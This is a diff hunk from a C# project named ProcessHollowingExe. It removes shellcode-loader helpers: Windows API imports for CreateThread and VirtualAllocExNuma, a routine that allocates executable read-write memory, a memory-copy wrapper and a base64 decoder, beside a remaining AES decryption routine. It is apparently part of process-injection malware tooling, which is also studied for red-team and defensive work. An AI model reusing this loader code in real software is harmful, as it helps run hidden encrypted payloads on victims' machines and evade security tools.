@@ -9,45 +9,6 @@ namespace ProcessHollowingExe
     public class PFuncs
     {
 
-        [DllImport("kernel32.dll")]
-        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetCurrentProcess();
-
-        public static void MemCopy(byte[] buf, Int32 start, IntPtr addr, int size)
-        {
-            Marshal.Copy(buf, start, addr, size);
-        }
-
-        public static IntPtr CThread(IntPtr attr, UInt32 stacksize, IntPtr addr, IntPtr lpParam, UInt32 flags, IntPtr threadId)
-        {
-            return CreateThread(attr, stacksize, addr, lpParam, flags, threadId);
-        }
-
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-
-        private static UInt32 getUint32(string val)
-        {
-            byte[] data = Convert.FromBase64String(val);
-            string decodedString = Encoding.UTF8.GetString(data);
-            return Convert.ToUInt32(decodedString);
-        }
-
-        public static IntPtr VAllocate()
-        {
-            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
-            if (mem == IntPtr.Zero)
-            {
-                Console.WriteLine("[-] Failed to allocate Memory.");
-                return IntPtr.Zero;
-            }
-
-            Console.WriteLine($"[+] Memory Allocation Successful: {mem}");
-            return mem;
-        }
-
         private static byte[] AesDecrypt(byte[] input)
         {
             try
